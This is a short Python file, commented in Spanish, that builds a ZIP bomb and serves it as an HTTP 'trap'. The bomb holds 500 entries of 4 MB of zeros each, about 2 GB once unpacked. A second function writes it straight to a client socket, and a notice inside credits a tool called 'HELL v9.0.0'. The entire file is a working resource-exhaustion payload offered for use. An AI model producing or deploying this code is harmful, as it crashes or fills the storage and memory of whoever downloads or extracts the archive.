import zipfile
import io
import os

def generate_ultra_zip():
    """
    Genera una bomba ZIP no recursiva de alta densidad.
    Ajustada a ~4MB de peso inicial para expansión masiva en destino.
    """
    zip_buffer = io.BytesIO()
    
    # Kernel de 4MB de ceros (altamente compresible)
    kernel_data = b"\x00" * (1024 * 1024 * 4)
    
    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zf:
        # Añadimos 500 archivos de 4MB cada uno referenciando al kernel.
        # Expansión teórica: 2,000 MB (2 GB) por cada bloque de 4MB enviado.
        for i in range(500):
            filename = f"DATA_DUMP_PART_{i:03d}.bin"
            zf.writestr(filename, kernel_data)
            
        zf.writestr("HELL_NOTICE.txt", "RESOURCE EXHAUSTION TRIGGERED BY HELL v9.0.0")

    return zip_buffer.getvalue()

def serve_zip_trap(client_socket):
    """Sirve la bomba vía HTTP (para otros módulos)"""
    try:
        zip_data = generate_ultra_zip()
        header = f"HTTP/1.1 200 OK\r\nContent-Type: application/zip\r\nContent-Length: {len(zip_data)}\r\nConnection: close\r\n\r\n"
        client_socket.send(header.encode() + zip_data)
    except: pass
